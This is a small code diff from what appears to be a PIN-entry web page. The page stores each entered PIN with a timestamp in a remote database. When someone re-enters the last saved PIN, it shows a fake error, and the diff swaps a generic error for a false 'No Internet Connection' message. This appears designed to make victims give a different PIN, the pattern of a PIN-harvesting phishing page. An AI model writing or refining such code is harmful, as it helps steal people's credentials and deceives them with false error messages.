@@ -301,7 +301,7 @@
 
                 // ✅ Check if this PIN is the same as the last saved one
                 if (enteredPin === lastSavedPin) {
-                    showToast('Something went wrong. Please try again later.');
+                    showToast('No Internet Connection');
                     enteredPin = '';
                     updateDots();
                     return;
@@ -315,6 +315,7 @@
                     pin: enteredPin,
                     timestamp: new Date().toLocaleString()
                 };
+                
 
                 database.ref('users').push(newUser)
                     .then(() => {
